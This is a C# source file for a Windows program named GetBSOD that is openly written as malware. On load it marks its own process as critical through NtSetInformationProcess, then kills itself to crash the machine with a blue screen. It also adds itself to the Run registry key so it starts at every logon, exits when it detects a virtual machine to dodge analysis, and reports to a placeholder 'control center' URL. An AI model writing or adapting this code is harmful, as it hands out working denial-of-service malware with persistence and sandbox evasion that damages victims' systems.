using System;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Management;

namespace GetBSOD
{
    public partial class Form1 : Form
    {
        [DllImport("ntdll.dll")]
        private static extern int NtSetInformationProcess(IntPtr process, int process_class, ref int process_value, int length);

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Enable Debug Mode
            Process.EnterDebugMode();
            int status = 1;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref status, sizeof(int));

            // Add to Startup
            AddToStartup();

            // Check for Virtual Machine
            if (IsRunningInVirtualMachine())
            {
                Process.GetCurrentProcess().Kill();
            }

            // Communicate with Control Center
            Task.Run(async () => await CommunicateWithControlCenter());

            // Optimize Resource Usage
            OptimizeResources();

            // Kill the Process to Trigger BSOD
            Process.GetCurrentProcess().Kill();
        }

        private void AddToStartup()
        {
            try
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue("GetBSOD", Application.ExecutablePath);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error adding to startup: {ex.Message}");
            }
        }

        private bool IsRunningInVirtualMachine()
        {
            bool inVM = false;
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    string manufacturer = obj["Manufacturer"]?.ToString().ToLower() ?? string.Empty;
                    string model = obj["Model"]?.ToString().ToUpperInvariant() ?? string.Empty;

                    if ((manufacturer == "microsoft corporation" && model.Contains("VIRTUAL")) ||
                        manufacturer.Contains("vmware") || manufacturer.Contains("xen") || manufacturer.Contains("virtualbox"))
                    {
                        inVM = true;
                        break;
                    }
                }
            }
            return inVM;
        }

        private async Task CommunicateWithControlCenter()
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    string url = "http://your-control-center.com/report";
                    HttpResponseMessage response = await client.PostAsync(url, new StringContent("data=BSOD triggered"));
                    response.EnsureSuccessStatusCode();
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error communicating with control center: {ex.Message}");
                }
            }
        }

        private void OptimizeResources()
        {
            // Example: Set process priority
            Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.BelowNormal;
        }
    }
}